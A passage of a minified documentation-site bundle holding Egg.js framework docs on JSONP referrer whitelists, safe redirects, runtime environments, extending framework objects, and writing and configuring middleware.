`,paraId:196,tocIndex:35},{value:"String: two cases exists when configuring the whitelist as a string, if the string begins with a ",paraId:197,tocIndex:35},{value:".",paraId:197,tocIndex:35},{value:", e.g. ",paraId:197,tocIndex:35},{value:".test.com",paraId:197,tocIndex:35},{value:", the referrer whitelist indicates all sub-domains of ",paraId:197,tocIndex:35},{value:"test.com",paraId:197,tocIndex:35},{value:", ",paraId:197,tocIndex:35},{value:"test.com",paraId:197,tocIndex:35},{value:" itself included. if the string does not begin with a ",paraId:197,tocIndex:35},{value:".",paraId:197,tocIndex:35},{value:", e.g. ",paraId:197,tocIndex:35},{value:"sub.test.com",paraId:197,tocIndex:35},{value:", it indicates ",paraId:197,tocIndex:35},{value:"sub.test.com",paraId:197,tocIndex:35},{value:" one domain only. (both HTTP and HTTPS are supported)",paraId:197,tocIndex:35},{value:`exports.jsonp = {
  whiteList: '.test.com',
};
// matches domain test.com:
// https://test.com/hello
// http://test.com/

// matches subdomain
// https://sub.test.com/hello
// http://sub.sub.test.com/

exports.jsonp = {
  whiteList: 'sub.test.com',
};
// only matches domain sub.test.com:
// https://sub.test.com/hello
// http://sub.test.com/
`,paraId:198,tocIndex:35},{value:"Array: when the whitelist is configured as an array, the referrer validation is passed only if at least one condition represented by array items is matched.",paraId:199,tocIndex:35},{value:`exports.jsonp = {
  whiteList: ['sub.test.com', 'sub2.test.com'],
};
// matches domain sub.test.com and sub2.test.com:
// https://sub.test.com/hello
// http://sub2.test.com/
`,paraId:200,tocIndex:35},{value:"If both CSRF and referrer validation are enabled, the request sender passes any one of them passes the JSONP security validation.",paraId:201,tocIndex:35},{value:"We identify whether the request is successful or not by using the status code and set response content in the body. By setting the response header, extended information can be set as well.",paraId:202,tocIndex:36},{value:"ctx.set(key, value)",paraId:203,tocIndex:36},{value:" sets one response header and ",paraId:203,tocIndex:36},{value:"ctx.set(headers)",paraId:203,tocIndex:36},{value:" sets many in one time.",paraId:203,tocIndex:36},{value:`// app/controller/api.js
class ProxyController extends Controller {
  async show() {
    const ctx = this.ctx;
    const start = Date.now();
    ctx.body = await ctx.service.post.get();
    const used = Date.now() - start;
    // set one response header
    ctx.set('show-response-time', used.toString());
  }
}
`,paraId:204,tocIndex:36},{value:"The framework overwrites koa's native ",paraId:205,tocIndex:37},{value:"ctx.redirect",paraId:205,tocIndex:37},{value:" implementation with a security plugin to provide a more secure redirect.",paraId:205,tocIndex:37},{value:"ctx.redirect(url)",paraId:206,tocIndex:37},{value:" Forbids redirect if it is not in the configured whitelist domain name.",paraId:206,tocIndex:37},{value:"ctx.unsafeRedirect(url)",paraId:206,tocIndex:37},{value:" does not determine the domain name and redirect directly. Generally, it is not recommended to use it. Use it after clearly understanding the possible risks.",paraId:206,tocIndex:37},{value:"If you use the ",paraId:207,tocIndex:37},{value:"ctx.redirect",paraId:207,tocIndex:37},{value:" method, you need to configure the application configuration file as follows:",paraId:207,tocIndex:37},{value:`// config/config.default.js
exports.security = {
  domainWhiteList: ['.domain.com'], // Security whitelist, starts with \`.\`
};
`,paraId:208,tocIndex:37},{value:"If the user does not configure the ",paraId:209,tocIndex:37},{value:"domainWhiteList",paraId:209,tocIndex:37},{value:" or the ",paraId:209,tocIndex:37},{value:"domainWhiteList",paraId:209,tocIndex:37},{value:" array to be empty, then all redirect requests will be released by default, which is equivalent to ",paraId:209,tocIndex:37},{value:"ctx.unsafeRedirect(url)",paraId:209,tocIndex:37},{value:".",paraId:209,tocIndex:37}]},96567:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(99292);const t=[{value:"An web application itself should be stateless and has the ability to set its own according to the runtime environment.",paraId:0},{value:"Egg has two ways to configure runtime environment:",paraId:1,tocIndex:0},{value:"Use ",paraId:2,tocIndex:0},{value:"config/env",paraId:2,tocIndex:0},{value:" file, usually we use the build tools to generate this file, the content of this file is just an env value, such as ",paraId:2,tocIndex:0},{value:"prod",paraId:2,tocIndex:0},{value:".",paraId:2,tocIndex:0},{value:`// config/env
prod
`,paraId:3,tocIndex:0},{value:"Defining the runtime environment via ",paraId:4,tocIndex:0},{value:"EGG_SERVER_ENV",paraId:4,tocIndex:0},{value:" when you start the application is more convenient, for example, use the code below to start the application in the production environment.",paraId:4,tocIndex:0},{value:`EGG_SERVER_ENV=prod npm start
`,paraId:5,tocIndex:0},{value:"Egg provides a variable ",paraId:6,tocIndex:1},{value:"app.config.env",paraId:6,tocIndex:1},{value:" to represent the current runtime environment of application.",paraId:6,tocIndex:1},{value:"Different running environment corresponds to different configurations, read ",paraId:7,tocIndex:2},{value:"Configuration of Config",paraId:8,tocIndex:2},{value:" in detail.",paraId:7,tocIndex:2},{value:"NODE_ENV",paraId:9},{value:"Lots of Node.js applications use ",paraId:10,tocIndex:3},{value:"NODE_ENV",paraId:10,tocIndex:3},{value:" to distinguish the runtime environment, but ",paraId:10,tocIndex:3},{value:"EGG_SERVER_ENV",paraId:10,tocIndex:3},{value:" distinguishes the environments much more specific. Generally speaking, there are local environment, test environment, production environment during the application development. In addition to the local development environment and the test environment, other environments are collectively referred to as the ",paraId:10,tocIndex:3},{value:"Server Environment",paraId:10,tocIndex:3},{value:" and their ",paraId:10,tocIndex:3},{value:"NODE_ENV",paraId:10,tocIndex:3},{value:" should be set to ",paraId:10,tocIndex:3},{value:"production",paraId:10,tocIndex:3},{value:". What's more, npm will use this variable and will not install the devDependencies when you deploy applications, so ",paraId:10,tocIndex:3},{value:"production",paraId:10,tocIndex:3},{value:" should also be applied.",paraId:10,tocIndex:3},{value:"Default mapping of ",paraId:11,tocIndex:3},{value:"EGG_SERVER_ENV",paraId:11,tocIndex:3},{value:" and ",paraId:11,tocIndex:3},{value:"NODE_ENV",paraId:11,tocIndex:3},{value:" (will generate ",paraId:11,tocIndex:3},{value:"EGG_SERVER_ENV",paraId:11,tocIndex:3},{value:" from ",paraId:11,tocIndex:3},{value:"NODE_ENV",paraId:11,tocIndex:3},{value:" setting if ",paraId:11,tocIndex:3},{value:"EGG_SERVER_ENV",paraId:11,tocIndex:3},{value:" is not specified)",paraId:11,tocIndex:3},{value:"NODE_ENV",paraId:12,tocIndex:3},{value:"EGG_SERVER_ENV",paraId:12,tocIndex:3},{value:"remarks",paraId:12,tocIndex:3},{value:"local",paraId:12,tocIndex:3},{value:"local development environment",paraId:12,tocIndex:3},{value:"test",paraId:12,tocIndex:3},{value:"unittest",paraId:12,tocIndex:3},{value:"unit test environment",paraId:12,tocIndex:3},{value:"production",paraId:12,tocIndex:3},{value:"prod",paraId:12,tocIndex:3},{value:"production environment",paraId:12,tocIndex:3},{value:"For example, ",paraId:13,tocIndex:3},{value:"EGG_SERVER_ENV",paraId:13,tocIndex:3},{value:" will be set to prod when ",paraId:13,tocIndex:3},{value:"NODE_ENV",paraId:13,tocIndex:3},{value:" is set as ",paraId:13,tocIndex:3},{value:"production",paraId:13,tocIndex:3},{value:" and ",paraId:13,tocIndex:3},{value:"EGG_SERVER_ENV",paraId:13,tocIndex:3},{value:" is not specified.",paraId:13,tocIndex:3},{value:"In normal development process, it's not limit to these environments mentioned above. So you can customize environment for your development process.",paraId:14,tocIndex:4},{value:"For example, if you want to add SIT (System integration testing) to development process, you can set ",paraId:15,tocIndex:4},{value:"EGG_SERVER_ENV",paraId:15,tocIndex:4},{value:" to ",paraId:15,tocIndex:4},{value:"sit",paraId:15,tocIndex:4},{value:" (also recommend to set ",paraId:15,tocIndex:4},{value:"NODE_ENV = production",paraId:15,tocIndex:4},{value:"), the framework will load ",paraId:15,tocIndex:4},{value:"config/config.sit.js",paraId:15,tocIndex:4},{value:" when launching, and the runtime environment ",paraId:15,tocIndex:4},{value:"app.config.env",paraId:15,tocIndex:4},{value:" will be ",paraId:15,tocIndex:4},{value:"sit",paraId:15,tocIndex:4},{value:".",paraId:15,tocIndex:4},{value:"We are using ",paraId:16,tocIndex:5},{value:"app.env",paraId:16,tocIndex:5},{value:" to distinguish the environments in Koa, and the default value for ",paraId:16,tocIndex:5},{value:"app.env",paraId:16,tocIndex:5},{value:" is ",paraId:16,tocIndex:5},{value:"process.env.NODE_ENV",paraId:16,tocIndex:5},{value:". But in Egg (and frameworks base on Egg), we put all the configurations in ",paraId:16,tocIndex:5},{value:"app.config",paraId:16,tocIndex:5},{value:", so we should use ",paraId:16,tocIndex:5},{value:"app.config.env",paraId:16,tocIndex:5},{value:" to distinguish the environments, ",paraId:16,tocIndex:5},{value:"app.env",paraId:16,tocIndex:5},{value:" is no longer used.",paraId:16,tocIndex:5}]},27796:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(35182);const t=[{value:"Egg.js is extensible and it provides multiple extension points to enhance the functionality of itself:",paraId:0},{value:"Application",paraId:1},{value:"Context",paraId:1},{value:"Request",paraId:1},{value:"Response",paraId:1},{value:"Helper",paraId:1},{value:"We could use the extension APIs to help us to develop, or extend the objects given above to enhance the functionality of egg as well while programming.",paraId:2},{value:"The object ",paraId:3,tocIndex:0},{value:"app",paraId:3,tocIndex:0},{value:" is just the same aspect as the global application object in Koa. There should be only one ",paraId:3,tocIndex:0},{value:"app",paraId:3,tocIndex:0},{value:" in your application, and it will be created by egg when the application is started.",paraId:3,tocIndex:0},{value:"ctx.app",paraId:4,tocIndex:1},{value:"You can access the Application object by using ",paraId:5,tocIndex:1},{value:"this.app",paraId:5,tocIndex:1},{value:" in Controller, Middleware, Helper, Service. For instance, ",paraId:5,tocIndex:1},{value:"this.app.config",paraId:5,tocIndex:1},{value:" will help you access the Config object.",paraId:5,tocIndex:1},{value:"The ",paraId:6,tocIndex:1},{value:"app",paraId:6,tocIndex:1},{value:" object would be injected into the entry function as the first argument in ",paraId:6,tocIndex:1},{value:"app.js",paraId:6,tocIndex:1},{value:", like this:",paraId:6,tocIndex:1},{value:`// app.js
module.exports = (app) => {
  // here you can use the app object
};
`,paraId:7,tocIndex:1},{value:"Egg will merge the object defined in ",paraId:8,tocIndex:2},{value:"app/extend/application.js",paraId:8,tocIndex:2},{value:" with the prototype of Application object in Koa, then generate object ",paraId:8,tocIndex:2},{value:"app",paraId:8,tocIndex:2},{value:" which is based on the extended prototype when application is started.",paraId:8,tocIndex:2},{value:"If we want to create a method ",paraId:9,tocIndex:3},{value:"app.foo()",paraId:9,tocIndex:3},{value:", we can do it like this: \uFF1A",paraId:9,tocIndex:3},{value:`// app/extend/application.js
module.exports = {
  foo(param) {
    // \`this\` points to the object app, you can access other methods or property of app with this
  },
};
`,paraId:10,tocIndex:3},{value:"Generally speaking, the calculation of properties only need to be done once, therefore we have to do some cache, otherwise it will degrade performance of the app as too much calculation would be going to do when accessing those properties several times.",paraId:11,tocIndex:4},{value:"So, it's recommended to use Symbol + Getter.",paraId:12,tocIndex:4},{value:"For example, if we would like to add a Getter property ",paraId:13,tocIndex:4},{value:"app.bar",paraId:13,tocIndex:4},{value:":",paraId:13,tocIndex:4},{value:`// app/extend/application.js
const BAR = Symbol('Application#bar');

module.exports = {
  get bar() {
    // \`this\` points to the app object, you can access other methods or property of app with this
    if (!this[BAR]) {
      // It should be more complex in real situation
      this[BAR] = this.config.xx + this.config.yy;
    }
    return this[BAR];
  },
};
`,paraId:14,tocIndex:4},{value:"Context means the context in Koa, which is a ",paraId:15,tocIndex:5},{value:"Request Level",paraId:15,tocIndex:5},{value:" object. That is to say, every request from client will generate an Context instance. We usually write Context as ",paraId:15,tocIndex:5},{value:"ctx",paraId:15,tocIndex:5},{value:" in short. In all the doc, both Context and ",paraId:15,tocIndex:5},{value:"ctx",paraId:15,tocIndex:5},{value:" means the context object in Koa.",paraId:15,tocIndex:5},{value:"this",paraId:16,tocIndex:6},{value:" in middleware is ctx, such as ",paraId:16,tocIndex:6},{value:"this.cookies.get('foo')",paraId:16,tocIndex:6},{value:"\u3002",paraId:16,tocIndex:6},{value:"There are two different ways to write controller. If you use class to describe controller, you can use ",paraId:16,tocIndex:6},{value:"this.ctx",paraId:16,tocIndex:6},{value:" to access Context. Or if you write as method, you can access Context with ",paraId:16,tocIndex:6},{value:"ctx",paraId:16,tocIndex:6},{value:" directly.",paraId:16,tocIndex:6},{value:"this",paraId:16,tocIndex:6},{value:" in helper, service points to the helper object and service object themselves. Simply use ",paraId:16,tocIndex:6},{value:"this.ctx",paraId:16,tocIndex:6},{value:" to access Context object, such as ",paraId:16,tocIndex:6},{value:"this.ctx.cookies.get('foo')",paraId:16,tocIndex:6},{value:".",paraId:16,tocIndex:6},{value:"Egg will merge the object defined in ",paraId:17,tocIndex:7},{value:"app/extend/context.js",paraId:17,tocIndex:7},{value:" with the prototype of Context object in Koa. And it will generate a ",paraId:17,tocIndex:7},{value:"ctx",paraId:17,tocIndex:7},{value:" object which is based on the extended prototype when deal with request.",paraId:17,tocIndex:7},{value:"For instance, we could add a method ",paraId:18,tocIndex:8},{value:"ctx.foo()",paraId:18,tocIndex:8},{value:" in the following way:",paraId:18,tocIndex:8},{value:`// app/extend/context.js
module.exports = {
  foo(param) {
    // \`this\` points to the ctx object, you can access other methods or property of ctx
  },
};
`,paraId:19,tocIndex:8},{value:"Generally speaking, the calculation of properties only need to do once, therefore we have to do some cache, otherwise it will degrade performance of the app as too much calculation would be going to do when access those properties several times.",paraId:20,tocIndex:9},{value:"So, it's recommended to use Symbol + Getter.",paraId:21,tocIndex:9},{value:"For example, if we would like to add a Getter property ",paraId:22,tocIndex:9},{value:"ctx.bar",paraId:22,tocIndex:9},{value:":",paraId:22,tocIndex:9},{value:`// app/extend/context.js
const BAR = Symbol('Context#bar');

module.exports = {
  get bar() {
    // \`this\` points to the ctx object, you can access other methods or property of ctx
    if (!this[BAR]) {
      // For example, we can get from header, but it should be more complex in real situation.
      this[BAR] = this.get('x-bar');
    }
    return this[BAR];
  },
};
`,paraId:23,tocIndex:9},{value:"Request object is the same as that in Koa, which is a ",paraId:24,tocIndex:10},{value:"Request Level",paraId:24,tocIndex:10},{value:" object. It provides a great number of methods to help to access the properties and methods you need.",paraId:24,tocIndex:10},{value:`ctx.request;
`,paraId:25,tocIndex:11},{value:"So many properties and methods in ",paraId:26,tocIndex:11},{value:"ctx",paraId:26,tocIndex:11},{value:" can also be accessed in ",paraId:26,tocIndex:11},{value:"request",paraId:26,tocIndex:11},{value:" object. For those properties and methods, it is just the same to access them by using either ",paraId:26,tocIndex:11},{value:"ctx",paraId:26,tocIndex:11},{value:" or ",paraId:26,tocIndex:11},{value:"request",paraId:26,tocIndex:11},{value:", such as ",paraId:26,tocIndex:11},{value:"ctx.url === ctx.request.url",paraId:26,tocIndex:11},{value:".",paraId:26,tocIndex:11},{value:"Here are the properties and methods in ",paraId:27,tocIndex:11},{value:"ctx",paraId:27,tocIndex:11},{value:" which can also be accessed by Request aliases: ",paraId:27,tocIndex:11},{value:"Koa - Request aliases",paraId:27,tocIndex:11},{value:"Egg will merge the object defined in ",paraId:28,tocIndex:12},{value:"app/extend/request.js",paraId:28,tocIndex:12},{value:" and the prototype of ",paraId:28,tocIndex:12},{value:"request",paraId:28,tocIndex:12},{value:" object built in egg. And it will generate a ",paraId:28,tocIndex:12},{value:"request",paraId:28,tocIndex:12},{value:" object which is based on the extended prototype when deal with request.",paraId:28,tocIndex:12},{value:"For instance, we could add a property ",paraId:29,tocIndex:12},{value:"request.foo",paraId:29,tocIndex:12},{value:" in the following way:",paraId:29,tocIndex:12},{value:`// app/extend/request.js
module.exports = {
  get foo() {
    return this.get('x-request-foo');
  },
};
`,paraId:30,tocIndex:12},{value:"Response object is the same as that in Koa, which is a ",paraId:31,tocIndex:13},{value:"Request Level",paraId:31,tocIndex:13},{value:" object. It provides a great number of methods to help to access the properties and methods you need.",paraId:31,tocIndex:13},{value:`ctx.response;
`,paraId:32,tocIndex:14},{value:"So many properties and methods in ",paraId:33,tocIndex:14},{value:"ctx",paraId:33,tocIndex:14},{value:" can also be accessed in ",paraId:33,tocIndex:14},{value:"response",paraId:33,tocIndex:14},{value:" object. For those properties and methods, it is just the same to access them by using either ",paraId:33,tocIndex:14},{value:"ctx",paraId:33,tocIndex:14},{value:" or ",paraId:33,tocIndex:14},{value:"response",paraId:33,tocIndex:14},{value:". For example ",paraId:33,tocIndex:14},{value:"ctx.status = 404",paraId:33,tocIndex:14},{value:" is the same as ",paraId:33,tocIndex:14},{value:"ctx.response.status = 404",paraId:33,tocIndex:14},{value:".",paraId:33,tocIndex:14},{value:"Here are the properties and methods in ",paraId:34,tocIndex:14},{value:"ctx",paraId:34,tocIndex:14},{value:" which can also be accessed by Response aliases: ",paraId:34,tocIndex:14},{value:"Koa Response aliases",paraId:34,tocIndex:14},{value:"Egg will merge the object defined in ",paraId:35,tocIndex:15},{value:"app/extend/response.js",paraId:35,tocIndex:15},{value:" and the prototype of ",paraId:35,tocIndex:15},{value:"response",paraId:35,tocIndex:15},{value:" object build in egg. And it will generate a ",paraId:35,tocIndex:15},{value:"response",paraId:35,tocIndex:15},{value:" object which is based on the extended prototype after dealt with request.",paraId:35,tocIndex:15},{value:"For instance, we could add a setter ",paraId:36,tocIndex:15},{value:"request.foo",paraId:36,tocIndex:15},{value:" in the following way:",paraId:36,tocIndex:15},{value:`// app/extend/response.js
module.exports = {
  set foo(value) {
    this.set('x-response-foo', value);
  },
};
`,paraId:37,tocIndex:15},{value:"Then we can use the setter like this: ",paraId:38,tocIndex:15},{value:"this.response.foo = 'bar';",paraId:38,tocIndex:15},{value:"Function Helper can provides some useful utility functions.",paraId:39,tocIndex:16},{value:"We can put some utility functions we use ofter into helper.js as an individual function. Then we can write the complex codes in JavaScript, avoiding to write them everywhere. Besides, such a simple function like Helper allows to write test case much easier.",paraId:40,tocIndex:16},{value:"Egg has had some build-in Helper functions. We can write our own Helper as well.",paraId:41,tocIndex:16},{value:"Access helper object with ",paraId:42,tocIndex:17},{value:"ctx.helper",paraId:42,tocIndex:17},{value:", for example:",paraId:42,tocIndex:17},{value:`// Assume that home router has already defined in app/router.js
app.get('home', '/', 'home.index');

// Use helper to calculate the specific url path
ctx.helper.pathFor('home', { by: 'recent', limit: 20 });
// => /?by=recent&limit=20
`,paraId:43,tocIndex:17},{value:"Egg will merge the object defined in ",paraId:44,tocIndex:18},{value:"app/extend/helper.js",paraId:44,tocIndex:18},{value:" and the prototype of ",paraId:44,tocIndex:18},{value:"helper",paraId:44,tocIndex:18},{value:" object build in egg. And it will generate a ",paraId:44,tocIndex:18},{value:"helper",paraId:44,tocIndex:18},{value:" object which is based on the extended prototype after dealt with request.",paraId:44,tocIndex:18},{value:"For instance, we could add a method ",paraId:45,tocIndex:18},{value:"helper.foo()",paraId:45,tocIndex:18},{value:" in the following way:",paraId:45,tocIndex:18},{value:`// app/extend/helper.js
module.exports = {
  foo(param) {
    // // \`this\` points to the helper object, you can access other methods or property of helper
    // this.ctx => context object
    // this.app => application object
  },
};
`,paraId:46,tocIndex:18},{value:"Besides, we can extend the framework in an optional way according to the environment. For example, if you want ",paraId:47,tocIndex:19},{value:"mockXX()",paraId:47,tocIndex:19},{value:" only be able to accessed when doing unittest:",paraId:47,tocIndex:19},{value:`// app/extend/application.unittest.js
module.exports = {
  mockXX(k, v) {},
};
`,paraId:48,tocIndex:19},{value:"This file will only be required under unittest environment.",paraId:49,tocIndex:19},{value:"Similarly, we could extend egg in this way for other object,such as Application, Context, Request, Response and Helper. See more on ",paraId:50,tocIndex:19},{value:"environment",paraId:51,tocIndex:19}]},17462:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(11089);const t=[{value:"Structure",paraId:0},{value:"Framework Built-in Objects",paraId:1},{value:"Runtime Environment",paraId:2},{value:"Configuration",paraId:3},{value:"Middleware",paraId:4},{value:"Router",paraId:5},{value:"Controller",paraId:6},{value:"Service",paraId:7},{value:"Plugin",paraId:8},{value:"Scheduled Tasks",paraId:9},{value:"Extend EGG",paraId:10},{value:"Application Startup Configuration",paraId:11}]},65379:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(13388);const t=[{value:"In ",paraId:0},{value:"the previous chapter",paraId:1},{value:", we say that Egg is based on Koa, so the form of middleware in Egg is the same as in Koa, i.e. they are both based on ",paraId:0},{value:"the onion model",paraId:2},{value:".",paraId:0},{value:"Let's take a look at how to write a middleware from a simple gzip example.",paraId:3,tocIndex:1},{value:`const isJSON = require('koa-is-json');
const zlib = require('zlib');

async function gzip(ctx, next) {
  await next();

  // convert the response body to gzip after the completion of the execution of subsequent middleware
  let body = ctx.body;
  if (!body) return;
  if (isJSON(body)) body = JSON.stringify(body);

  // set gzip body, correct the response header
  const stream = zlib.createGzip();
  stream.end(body);
  ctx.body = stream;
  ctx.set('Content-Encoding', 'gzip');
}
`,paraId:4,tocIndex:1},{value:"You might find that the middleware's style in the framework is exactly the same as in Koa, yes, any middleware in Koa can be used directly by the framework.",paraId:5,tocIndex:1},{value:"Usually the middleware has its own configuration. In the framework, a complete middleware includes the configuration process. A middleware is a single file placed under ",paraId:6,tocIndex:2},{value:"app/middleware",paraId:6,tocIndex:2},{value:" directory, which needs to exports a function that accepts two parameters:",paraId:6,tocIndex:2},{value:"options: the configuration field of the middleware, ",paraId:7,tocIndex:2},{value:"app.config[${middlewareName}]",paraId:7,tocIndex:2},{value:" will be passed in by the framework",paraId:7,tocIndex:2},{value:"app: the Application instance of current application",paraId:7,tocIndex:2},{value:"We will do a simple optimization to the gzip middleware above, making it do gzip compression only if the body size is greater than a configured threshold. So, we need to create a new file ",paraId:8,tocIndex:2},{value:"gzip.js",paraId:8,tocIndex:2},{value:" in ",paraId:8,tocIndex:2},{value:"app/middleware",paraId:8,tocIndex:2},{value:" directory.",paraId:8,tocIndex:2},{value:`// app/middleware/gzip.js
const isJSON = require('koa-is-json');
const zlib = require('zlib');

module.exports = (options) => {
  return async function gzip(ctx, next) {
    await next();

    // convert the response body to gzip after the completion of the execution of subsequent middleware
    let body = ctx.body;
    if (!body) return;

    // support options.threshold
    if (options.threshold && ctx.length < options.threshold) return;

    if (isJSON(body)) body = JSON.stringify(body);

    // set gzip body, correct the response header
    const stream = zlib.createGzip();
    stream.end(body);
    ctx.body = stream;
    ctx.set('Content-Encoding', 'gzip');
  };
};
`,paraId:9,tocIndex:2},{value:"After writing middleware, we also need to mount it, there are following ways to support:",paraId:10,tocIndex:3},{value:`We can load customized middleware completely by configuration in the application, and decide their order.
If we need to load the gzip middleware in the above,
we can edit `,paraId:11,tocIndex:4},{value:"config.default.js",paraId:11,tocIndex:4},{value:" like this:",paraId:11,tocIndex:4},{value:`module.exports = {
  // configure the middleware you need, which loads in the order of array
  middleware: ['gzip'],

  // configure the gzip middleware
  gzip: {
    threshold: 1024, // skip response body which size is less than 1K
  },
};
`,paraId:12,tocIndex:4},{value:"This config will be merged to ",paraId:13,tocIndex:4},{value:"app.config.appMiddleware",paraId:13,tocIndex:4},{value:" at starting up.",paraId:13,tocIndex:4},{value:"Framework and Plugin don't support to configure ",paraId:14,tocIndex:5},{value:"middleware",paraId:14,tocIndex:5},{value:" in ",paraId:14,tocIndex:5},{value:"config.default.js",paraId:14,tocIndex:5},{value:", you should mount it in ",paraId:14,tocIndex:5},{value:"app.js",paraId:14,tocIndex:5},{value:":",paraId:14,tocIndex:5},{value:`// app.js
module.exports = (app) => {
  // put to the first place to count request cost
  app.config.coreMiddleware.unshift('report');
};

// app/middleware/report.js
module.exports = () => {
  return async function (ctx, next) {
    const startTime = Date.now();
    await next();
    reportTime(Date.now() - startTime);
  };
};
`,paraId:15,tocIndex:5},{value:"Middlewares which are defined at Application (",paraId:16,tocIndex:5},{value:"app.config.appMiddleware",paraId:16,tocIndex:5},{value:") and Framework(",paraId:16,tocIndex:5},{value:"app.config.coreMiddleware",paraId:16,tocIndex:5},{value:") will be merged to ",paraId:16,tocIndex:5},{value:"app.middleware",paraId:16,tocIndex:5},{value:" by loader at staring up.",paraId:16,tocIndex:5},{value:"The middleware configured in the above ways is global, and it will process every request.",paraId:17,tocIndex:6},{value:"If you do want to take effect only for single route, you could just instantiate and mount it at ",paraId:18,tocIndex:6},{value:"app/router.js",paraId:18,tocIndex:6},{value:":",paraId:18,tocIndex:6},{value:`module.exports = (app) => {
  const gzip = app.middleware.gzip({ threshold: 1024 });
  app.router.get('/needgzip', gzip, app.controller.handler);
};
`,paraId:19,tocIndex:6},{value:"In addition to application layer loading middleware, the framework itself and other plugins will also load many middlewares. All the config fields of these built-in middlewares can be modified by modifying the ones with the same name in the config file, for example ",paraId:20,tocIndex:7},{value:"Framework Built-in Plugin",paraId:20,tocIndex:7},{value:" uses a bodyParser middleware(the framework loader will change the various delimiters in the file name into the camel style), and we can add configs below in ",paraId:20,tocIndex:7},{value:"config/config.default.js",paraId:20,tocIndex:7},{value:" to modify the bodyParser:",paraId:20,tocIndex:7},{value:`module.exports = {
  bodyParser: {
    jsonLimit: '10m',
  },
};
`,paraId:21,tocIndex:7},{value:"** Note: middleware loaded by the framework and plugins are loaded earlier than those loaded by the application layer, and the application-layer middleware cannot overwrite the default framework middleware. If the application layer loads customized middleware that has the same name with default framework middleware, an error will be reported on starting up. **",paraId:22,tocIndex:7},{value:"Developer is free to use Koa Middleware, all middlewares used in Koa can be directly used in the framework too.",paraId:23,tocIndex:8},{value:"For example, Koa uses ",paraId:24,tocIndex:8},{value:"koa-compress",paraId:24,tocIndex:8},{value:" in this way:",paraId:24,tocIndex:8},{value:`const koa = require('koa');
const compress = require('koa-compress');

const app = koa();

const options = { threshold: 2048 };
app.use(compress(options));
`,paraId:25,tocIndex:8},{value:"We can load the middleware according to the framework specification like this:",paraId:26,tocIndex:8},{value:`// app/middleware/compress.js
// interfaces(\`(options) => middleware\`) exposed by koa-compress match the framework middleware requirements
module.exports = require('koa-compress');
`,paraId:27,tocIndex:8},{value:`// config/config.default.js
module.exports = {
  middleware: ['compress'],
  compress: {
    threshold: 2048,
  },
};
`,paraId:28,tocIndex:8},{value:"If the third-party Koa middleware do not follow the rule, then you can wrap it yourself:",paraId:29,tocIndex:8},{value:`// config/config.default.js
module.exports = {
  webpack: {
    compiler: {},
    others: {},
  },
};

// app/middleware/webpack.js
const webpackMiddleware = require('some-koa-middleware');

module.exports = (options, app) => {
  return webpackMiddleware(options.compiler, options.others);
};
`,paraId:30,tocIndex:8},{value:"These general config fields are supported by middleware loaded by the application layer and built in by the framework:",paraId:31,tocIndex:9},{value:"enable: enable the middleware or not",paraId:32,tocIndex:9},{value:"match: set some rules with which only the request matches can go through this middleware",paraId:32,tocIndex:9},{value:"ignore: set some rules with which the request matches can't go through this middleware",paraId:32,tocIndex:9},{value:"If our application does not need default bodyParser to resolve the request body, we can configure enable for false to close it.",paraId:33,tocIndex:10},{value:`module.exports = {
  bodyParser: {
    enable: false,
  },
};
`,paraId:34,tocIndex:10},{value:"match",paraId:35},{value:"ignore",paraId:35},{value:"match and ignore share the same parameter but do the opposite things. match and ignore cannot be configured in the same time.",paraId:36,tocIndex:11},{value:"If we want gzip to be used only by url requests starting with ",paraId:37,tocIndex:11},{value:"/static",paraId:37,tocIndex:11},{value:", the match config field can be set like this:",paraId:37,tocIndex:11},{value:`module.exports = {
  gzip: {
    match: '/static',
  },
};
`,paraId:38,tocIndex:11},{value:"match and ignore support various types of configuration ways:",paraId:39,tocIndex:11},{value:"String: when string, it sets the prefix of a url path, and all urls starting with this prefix will be matched. A string array is also accepted.",paraId:40,tocIndex:11},{value:"Regular expression: when regular expression, all urls satisfy this regular expression will be matched.",paraId:40,tocIndex:11},{value:"Function: when function, the request context will be passed to it and what it returns(true/false) determines whether the request is matched or not.",paraId:40,tocIndex:11},{value:`module.exports = {
  gzip: {
    match(ctx) {
      // enabled on ios devices
      const reg = /iphone|ipad|ipod/i;
      return reg.test(ctx.get('user-agent'));
    },
  },
};
`,paraId:41,tocIndex:11},{value:"For more configs about ",paraId:42,tocIndex:11},{value:"match",paraId:42,tocIndex:11},{value:" and ",paraId:42,tocIndex:11},{value:"ignore",paraId:42,tocIndex:11},{value:", please refer to ",paraId:42,tocIndex:11},{value:"egg-path-matching",paraId:42,tocIndex:11},{value:".",paraId:42,tocIndex:11}]},47259:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(4780);const t=[{value:"At this chapter, we will introduce some built-in basic objects in the framework, including four objects (Application, Context, Request, Response) inherited from ",paraId:0},{value:"Koa",paraId:0},{value:" and some objects that extended by the framework (Controller, Service , Helper, Config, Logger), we will often see them in the follow-up documents.",paraId:0},{value:"Application is a global application object, an application only instantiates one Application, it is inherited from ",paraId:1,tocIndex:0},{value:"Koa.Application",paraId:1,tocIndex:0},{value:", we can mount some global methods and objects on it. We can easily [extend Application object] (./extend.md#Application) in plugin or application.",paraId:1,tocIndex:0},{value:"Framework will emits some events when server running, application developers or plugin developers can listen on these events to do some job like logging. As application developers, we can listen on these events in ",paraId:2,tocIndex:1},{value:"app start script",paraId:3,tocIndex:1},{value:".",paraId:2,tocIndex:1},{value:"server",paraId:4,tocIndex:1},{value:": every worker will only emit once during the runtime, after HTTP server started, framework will expose HTTP server instance by this event.",paraId:4,tocIndex:1},{value:"error",paraId:4,tocIndex:1},{value:": if any exception catched by onerror plugin, it will emit an ",paraId:4,tocIndex:1},{value:"error",paraId:4,tocIndex:1},{value:" event with the exception instance and current context instance(if have), developers can listen on this event to report or logging.",paraId:4,tocIndex:1},{value:"request",paraId:4,tocIndex:1},{value:" and ",paraId:4,tocIndex:1},{value:"response",paraId:4,tocIndex:1},{value:": application will emit ",paraId:4,tocIndex:1},{value:"request",paraId:4,tocIndex:1},{value:" and ",paraId:4,tocIndex:1},{value:"response",paraId:4,tocIndex:1},{value:" event when receive requests and ended responses, developers can listen on these events to generate some digest log.",paraId:4,tocIndex:1},{value:`// app.js

module.exports = (app) => {
  app.once('server', (server) => {
    // websocket
  });
  app.on('error', (err, ctx) => {
    // report error
  });
